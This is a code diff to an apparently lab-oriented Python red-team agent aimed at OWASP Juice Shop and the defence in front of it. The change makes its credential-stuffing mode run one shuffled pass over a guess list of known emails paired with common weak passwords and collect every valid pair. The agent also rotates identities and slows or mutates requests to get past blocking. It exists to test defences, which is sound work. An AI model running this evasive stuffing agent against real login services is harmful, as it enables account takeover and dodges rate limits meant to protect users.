@@ -14,7 +14,8 @@ the defence's internals.
     before the first 429 becomes its per-identity quota, after which it rotates proactively.
 
 Goals:  credential_stuffing | sqli | command_injection
-  credential_stuffing  objective = find a valid credential pair
+  credential_stuffing  objective = harvest valid credential pairs from one shuffled pass over a
+                       ~80-pair guess list (the 3 valid pairs of the range are hidden in it)
   sqli                 objective = authentication bypass via SQL injection login
   command_injection    Juice Shop has no OS-command sink, so there is no objective to meet;
                        what is measured is EVASION: payload requests that reach the app.
@@ -58,7 +59,8 @@ class Report:
     passed: int = 0                       # attack-payload requests that were NOT blocked
     first_block_at: int | None = None     # request number of the first block
     objective_met: bool = False
-    requests_to_objective: int | None = None
+    requests_to_objective: int | None = None   # requests until the FIRST success
+    valid_found: list = field(default_factory=list)    # stuffing: every valid pair harvested
     adaptations: dict = field(default_factory=lambda: {"mutate": 0, "rotate": 0, "slow": 0})
     identities: int = 1
     learned_quota: int | None = None
@@ -97,9 +99,12 @@ class RedAgent:
     # --- payload stream ----------------------------------------------------------------
     def _payloads(self):
         if self.goal == "credential_stuffing":
-            while True:
-                for email, pw in C.CRED_LIST:
-                    yield (email, pw)
+            emails = list(dict.fromkeys(e for e, _ in C.CRED_LIST))
+            pws = ["123456", "password", "qwerty", "letmein", "welcome", "iloveyou",
+                   "abc123", "monkey", "dragon", "football", "sunshine", "master"]
+            pairs = list(dict.fromkeys(list(C.CRED_LIST) + [(e, p) for e in emails for p in pws]))
+            self.rng.shuffle(pairs)
+            yield from pairs                       # ONE pass: no re-trying the same guess
         elif self.goal == "sqli":
             while True:
                 for p in C.SQLI_LOGIN:
@@ -156,7 +161,9 @@ class RedAgent:
         gen = self._payloads()
         rep = self.rep
         while rep.requests < self.budget:
-            payload = next(gen)
+            payload = next(gen, None)
+            if payload is None:              # guess list exhausted
+                break
             r, ok = self._attempt(payload)
             rep.requests += 1
             if r.blocked:
@@ -170,9 +177,13 @@ class RedAgent:
                 rep.passed += 1
                 self.consec = 0
                 self.passes_this_id += 1
-            if ok and not rep.objective_met:
-                rep.objective_met, rep.requests_to_objective = True, rep.requests
-                break
+            if ok:
+                if not rep.objective_met:
+                    rep.objective_met, rep.requests_to_objective = True, rep.requests
+                if self.goal == "credential_stuffing":
+                    rep.valid_found.append(payload[0])
+                else:
+                    break
             if self.consec >= self.patience:
                 self._adapt()
             elif (rep.learned_quota and self.passes_this_id >= max(1, rep.learned_quota - 1)):
